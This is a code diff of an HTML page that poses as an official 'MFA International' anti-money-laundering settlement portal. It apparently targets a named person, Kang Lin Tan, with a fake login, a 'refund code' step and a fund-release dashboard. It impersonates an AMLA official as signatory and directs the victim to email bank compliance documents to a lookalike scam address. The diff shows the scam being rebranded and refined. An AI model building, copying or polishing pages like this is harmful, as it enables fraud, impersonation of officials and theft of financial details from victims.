@@ -3,41 +3,49 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MFA Europe | Global AML Settlement Portal</title>
+    <title>MFA International | Global AML Settlement Portal</title>
     <style>
         :root { --mfa-blue: #002366; --mfa-gold: #C5A021; --aml-red: #D32F2F; --gray-bg: #f8f9fa; }
+        
+        /* Uniform Font for Professional Banking Look */
         body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #cfd8dc; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; color: #333; }
         
         .container { background: white; width: 95%; max-width: 950px; min-height: 700px; display: flex; box-shadow: 0 40px 80px rgba(0,0,0,0.4); border-radius: 4px; overflow: hidden; }
         .login-box { width: 90%; max-width: 400px; background: white; border-radius: 8px; box-shadow: 0 20px 50px rgba(0,0,0,0.3); overflow: hidden; border-top: 8px solid var(--mfa-blue); padding-bottom: 30px; }
 
-        /* Sidebar */
+        /* Sidebar - International Branding */
         .sidebar { width: 260px; background: var(--mfa-blue); color: white; padding: 40px 25px; display: flex; flex-direction: column; border-right: 4px solid var(--mfa-gold); }
-        .sidebar h2 { color: var(--mfa-gold); font-size: 24px; margin: 0 0 5px 0; letter-spacing: 2px; font-weight: 800; }
-        .sidebar small { font-size: 10px; opacity: 0.8; margin-bottom: 30px; text-transform: uppercase; font-weight: bold; }
+        .sidebar h2 { color: var(--mfa-gold); font-size: 20px; margin: 0 0 5px 0; letter-spacing: 1px; font-weight: 800; }
+        .sidebar small { font-size: 9px; opacity: 0.8; margin-bottom: 30px; text-transform: uppercase; font-weight: bold; line-height: 1.4; }
         
-        .officer-badge { background: rgba(255,255,255,0.1); padding: 15px; border-radius: 4px; border-left: 3px solid var(--mfa-gold); margin-bottom: 30px; }
-        .officer-badge p { margin: 0; font-size: 11px; font-weight: bold; color: var(--mfa-gold); }
-        .officer-badge span { font-size: 10px; color: #fff; display: block; margin-top: 5px; line-height: 1.3; }
+        /* Authority Badge in Sidebar */
+        .officer-badge { background: rgba(255,255,255,0.08); padding: 15px; border-radius: 4px; border-left: 4px solid var(--mfa-gold); margin-bottom: 30px; }
+        .officer-badge p { margin: 0; font-size: 10px; font-weight: bold; color: var(--mfa-gold); text-transform: uppercase; }
+        .officer-badge .name { font-size: 12px; color: #fff; font-weight: 800; margin-top: 5px; display: block; }
+        .officer-badge .title { font-size: 9px; color: #ccc; display: block; margin-top: 3px; line-height: 1.2; }
 
-        .nav-item { padding: 16px 0; border-bottom: 1px solid rgba(255,255,255,0.1); font-size: 12px; color: #a8b2d1; }
+        .nav-item { padding: 16px 0; border-bottom: 1px solid rgba(255,255,255,0.1); font-size: 11px; color: #a8b2d1; letter-spacing: 0.5px; }
         .nav-item.active { color: white; font-weight: bold; border-left: 5px solid var(--mfa-gold); padding-left: 15px; background: rgba(255,255,255,0.1); }
 
+        /* Main Dashboard Area */
         .main-content { flex: 1; padding: 35px; background: #fff; overflow-y: auto; }
-        .top-header { display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #eee; padding-bottom: 15px; margin-bottom: 25px; }
+        .top-header { display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #eee; padding-bottom: 12px; margin-bottom: 20px; }
         
-        .info-grid { display: grid; grid-template-columns: 1fr; gap: 15px; margin-bottom: 25px; }
-        .info-card { background: var(--gray-bg); padding: 15px; border-radius: 4px; border-left: 5px solid var(--mfa-blue); }
-        .info-card small { font-size: 10px; color: #777; text-transform: uppercase; font-weight: bold; }
+        .info-grid { display: grid; grid-template-columns: 1fr; gap: 12px; margin-bottom: 20px; }
+        .info-card { background: var(--gray-bg); padding: 15px; border-radius: 4px; border-left: 4px solid var(--mfa-blue); }
+        .info-card small { font-size: 9px; color: #777; text-transform: uppercase; font-weight: bold; }
         .info-card p { margin: 5px 0 0; font-weight: bold; font-size: 14px; }
 
-        .vault-box { background: #111; color: white; padding: 25px; border-radius: 6px; display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px; border-right: 10px solid var(--aml-red); }
-        .vault-text h2 { margin: 5px 0 0; color: #fff; font-size: 28px; font-family: 'Courier New', Courier, monospace; }
+        /* Asset Status Box */
+        .vault-box { background: #111; color: white; padding: 25px; border-radius: 6px; display: flex; justify-content: space-between; align-items: center; margin-bottom: 25px; border-right: 10px solid var(--aml-red); }
+        .vault-text h2 { margin: 5px 0 0; color: #fff; font-size: 28px; font-family: 'Courier New', Courier, monospace; letter-spacing: 1px; }
 
+        /* Checklist Table */
         table { width: 100%; border-collapse: collapse; margin-bottom: 30px; }
-        th { text-align: left; font-size: 11px; color: #999; padding-bottom: 12px; border-bottom: 2px solid #eee; }
-        td { padding: 15px 0; border-bottom: 1px solid #f9f9f9; font-size: 13px; }
+        th { text-align: left; font-size: 10px; color: #999; padding-bottom: 10px; border-bottom: 2px solid #eee; }
+        td { padding: 14px 0; border-bottom: 1px solid #f9f9f9; font-size: 13px; }
         
+        /* Buttons and Inputs */
         .btn-mfa { background: var(--mfa-blue); color: white; padding: 16px; border-radius: 4px; font-weight: bold; border: none; cursor: pointer; width: 100%; font-size: 13px; }
         .btn-gmail { background: #000; color: #fff; padding: 18px 45px; text-decoration: none; font-weight: 800; border-radius: 4px; display: inline-block; font-size: 13px; border-bottom: 4px solid var(--aml-red); }
 
@@ -46,6 +54,7 @@
         .hidden { display: none !important; }
         input { width: 100%; padding: 12px; margin-bottom: 20px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
 
+        /* Responsive Mobile Layout */
         @media screen and (max-width: 600px) {
             .container { flex-direction: column; width: 100%; border-radius: 0; }
             .sidebar { width: 100%; padding: 20px; border-right: none; border-bottom: 3px solid var(--mfa-gold); box-sizing: border-box; }
@@ -56,10 +65,10 @@
 </head>
 <body>
 
-    <!-- PHASE 1: LOGIN -->
+    <!-- PHASE 1: LOGIN (USER: kanglintan / PASS: code00252) -->
     <div id="loginPhase1" class="login-box">
         <div style="background: var(--mfa-blue); color: white; padding: 25px; text-align: center;">
-            <h2 style="margin:0; letter-spacing: 3px; color: var(--mfa-gold); font-size: 20px;">MFA EUROPE</h2>
+            <h2 style="margin:0; letter-spacing: 2px; color: var(--mfa-gold); font-size: 18px;">MFA INTERNATIONAL</h2>
             <small style="font-size: 9px; opacity: 0.8;">OFFICIAL ACCESS GATEWAY</small>
         </div>
         <div style="padding: 35px;">
@@ -72,28 +81,30 @@
         </div>
     </div>
 
-    <!-- PHASE 2: REFUND CODE -->
+    <!-- PHASE 2: REFUND CODE (CODE: 006231) -->
     <div id="loginPhase2" class="login-box hidden">
         <div style="background: var(--mfa-blue); color: white; padding: 25px; text-align: center;">
-            <h2 style="margin:0; letter-spacing: 3px; color: var(--mfa-gold); font-size: 20px;">AUTHORIZATION</h2>
+            <h2 style="margin:0; letter-spacing: 2px; color: var(--mfa-gold); font-size: 18px;">AUTHORIZATION</h2>
         </div>
         <div style="padding: 35px;">
             <label style="font-size:11px; font-weight:bold;">REFUND CODE</label>
-            <input type="text" id="refundCode" placeholder="Enter 6-digit Code">
+            <input type="text" id="refundCode" placeholder="Enter Refund Code">
             <button onclick="checkPhase2()" class="btn-mfa">AUTHORIZE ACCESS</button>
             <div id="loader2" class="loader"></div>
         </div>
     </div>
 
-    <!-- DASHBOARD -->
+    <!-- MAIN DASHBOARD -->
     <div id="dashboard" class="container hidden">
         <div class="sidebar">
-            <h2>MFA EUROPE</h2>
-            <small>AML Compliance Unit</small>
+            <h2>MFA INTERNATIONAL</h2>
+            <small>Ministry of Foreign Affairs<br>AML Compliance Division</small>
             
+            <!-- OFFICER BADGE -->
             <div class="officer-badge">
-                <p>AUTHORIZING OFFICER:</p>
-                <span><strong>JUAN MANUEL VEGA SERRANO</strong><br>Vice Chair Executive Board Member, AMLA</span>
+                <p>Presiding Authority:</p>
+                <span class="name">JUAN MANUEL VEGA SERRANO</span>
+                <span class="title">Vice Chair Executive Board Member, AMLA</span>
             </div>
 
             <div class="nav-item active">AML CLEARANCE</div>
@@ -103,12 +114,13 @@
 
         <div class="main-content">
             <div class="top-header">
-                <span style="font-weight: 800; color: var(--mfa-blue); font-size: 16px;">SETTLEMENT PORTAL</span>
-                <span style="color: #999; font-size: 11px;">CASE: <strong style="color:var(--aml-red);">#MFA-57850-SG</strong></span>
+                <span style="font-weight: 800; color: var(--mfa-blue); font-size: 15px;">SETTLEMENT PORTAL</span>
+                <span style="color: #999; font-size: 10px;">CASE: <strong style="color:var(--aml-red);">#MFA-57850-SG</strong></span>
             </div>
 
             <div class="info-grid">
                 <div class="info-card"><small>Case Beneficiary</small><p>KANG LIN TAN</p></div>
+                <div class="info-card"><small>Region</small><p>International Settlement Corridor</p></div>
             </div>
 
             <div class="vault-box">
@@ -127,34 +139,31 @@
                 </tbody>
             </table>
 
-            <!-- RED COMPLIANCE BOX (LINKED TO YOUR EMAIL) -->
+            <!-- RED COMPLIANCE BOX (MOBILE OPTIMIZED) -->
             <div style="margin-top: 10px; padding: 40px; border: 3px solid var(--aml-red); border-radius: 8px; text-align: center; background: #fff;">
                 <div style="width: 75px; height: 75px; background: #000; color: white; border-radius: 50%; display: flex; flex-direction: column; align-items: center; justify-content: center; margin: 0 auto 20px; border: 4px solid var(--mfa-gold);">
                     <span style="font-weight: 900; font-size: 16px;">MFA</span>
                 </div>
 
-                <h4 style="margin: 0 0 10px 0; color: var(--aml-red); font-size: 15px; text-transform: uppercase; font-weight: 800;">WORLD INTERNATIONAL BANK - DISBURSEMENT DEPT.</h4>
+                <h4 style="margin: 0 0 10px 0; color: var(--aml-red); font-size: 15px; text-transform: uppercase; font-weight: 800;">WORLD INTERNATIONAL BANK - DISBURSEMENT</h4>
                 <p style="font-size: 12px; color: #555; line-height: 1.6; max-width: 500px; margin: 0 auto 25px;">
-                    Please submit your <strong>Bank Compliance Declaration</strong> to our AML Refund Disbursement Head for immediate fund release.
+                    Submit your <strong>Bank Compliance Declaration</strong> to the AML Disbursement Division for the immediate release of funds.
                 </p>
 
-                <div style="margin-bottom: 25px;">
-                    <p style="font-size: 11px; margin: 0; color: #333; font-weight: bold;">Verified by Authority:</p>
-                    <p style="font-size: 13px; margin: 5px 0; color: var(--mfa-blue); font-family: serif; font-style: italic; border-bottom: 1px solid #ccc; display: inline-block; padding: 0 20px;">
+                <!-- YOUR NAME AS FINAL AUTHORITY -->
+                <div style="margin-bottom: 25px; border-top: 1px solid #eee; padding-top: 20px;">
+                    <p style="font-size: 10px; color: #777; margin: 0;">Authorizing Signatory:</p>
+                    <p style="font-size: 16px; margin: 5px 0; color: var(--mfa-blue); font-weight: 800; text-transform: uppercase; letter-spacing: 1px;">
                         Juan Manuel Vega Serrano
                     </p>
-                    <p style="font-size: 9px; margin: 2px 0; color: #777;">VICE CHAIR EXECUTIVE BOARD MEMBER, AMLA</p>
+                    <p style="font-size: 10px; margin: 0; color: var(--mfa-gold); font-weight: bold;">VICE CHAIR EXECUTIVE BOARD MEMBER, AMLA</p>
                 </div>
 
-                <!-- SUBMIT BUTTON LINKED TO YOUR EMAIL -->
-                <a href="mailto:europiancustodysanchez@mfaauthorityeu.co.site?subject=AML/MFA Compliance: KANG LIN TAN - REF-57850-SG&body=Attn: JUAN MANUEL VEGA SERRANO,%0D%0A%0D%0AAttached are the required Bank Compliance documents for the settlement of Case REF-57850-SG." 
+                <!-- FIXED MAILTO LINK FOR MOBILE -->
+                <a href="mailto:europiancustodysanchez@mfaauthorityeu.co.site?subject=AML/MFA Compliance: KANG LIN TAN - REF-57850-SG&body=Attn: JUAN MANUEL VEGA SERRANO,%0D%0A%0D%0APlease find the attached Bank Compliance Declaration for Case REF-57850-SG." 
                    class="btn-gmail">
                     SUBMIT VIA SECURE GMAIL
                 </a>
-                
-                <div style="margin-top: 25px; font-size: 9px; color: #bbb; border-top: 1px solid #eee; padding-top: 15px;">
-                    OFFICIAL CORRESPONDENCE: <strong>europiancustodysanchez@mfaauthorityeu.co.site</strong>
-                </div>
             </div>
         </div>
     </div>
@@ -169,7 +178,7 @@
                     document.getElementById('loginPhase1').classList.add('hidden');
                     document.getElementById('loginPhase2').classList.remove('hidden');
                 }, 1000);
-            } else { alert("ACCESS DENIED"); }
+            } else { alert("ACCESS DENIED: Invalid User or Pass."); }
         }
         function checkPhase2() {
             const r = document.getElementById('refundCode').value;
